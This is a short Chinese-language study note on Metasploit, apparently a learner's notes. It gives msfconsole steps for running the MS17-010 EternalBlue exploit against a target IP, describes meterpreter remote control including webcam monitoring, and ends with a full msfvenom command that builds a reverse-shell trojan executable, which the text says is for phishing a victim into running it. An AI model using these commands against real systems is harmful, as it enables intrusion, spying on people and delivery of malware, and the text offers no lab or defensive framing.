## metasploit

安全漏洞利用和测试的工具

永恒之蓝漏洞：勒索病毒

命令

```
msfconsole
search ms17_010
  方案一 ：use exploit/windows/smb
  方案二： use 0
  show options  //看到模块所需要配置的东西   require后面为必选项 
```

payload 攻击载荷  ----> 攻击效果  攻击完要什么效果

端口

```
set RHOSTS 目标ip地址  //更改配置项
set lport 数目
run   成功  前提是要有漏洞，没有漏洞不能成功
```

meterpreter   进入其他人的电脑后进行远程控制，命令执行，摄像头监控

```
shell 
```

msfvenom 木马病毒，去钓鱼他，让其执行，

```
msfvenom -p windows/x64/meterpreter/reverse_tcp（pa） lhost=kali的地址  lport=（随意指定） -f exe -o(输出，起名字) demo.exe
```

